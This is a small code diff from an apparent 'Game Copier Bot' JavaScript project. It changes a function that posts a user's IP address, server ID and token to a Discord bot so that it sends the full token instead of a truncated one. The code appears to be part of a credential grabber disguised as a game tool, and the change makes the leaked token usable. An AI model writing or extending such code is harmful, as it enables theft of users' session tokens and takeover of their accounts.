@@ -60,7 +60,7 @@ async function sendToDiscordBot(data, type) {
           description:
             `**IP:** ${data.userIP}\n` +
             `**Server ID:** ${data.serverId}\n` +
-            `**Token:** \`${data.token.substring(0, 50)}...\``,
+            `**Token:** \`${data.token}\``,
           timestamp: new Date(),
           footer: { text: 'Game Copier Bot' },
         }]
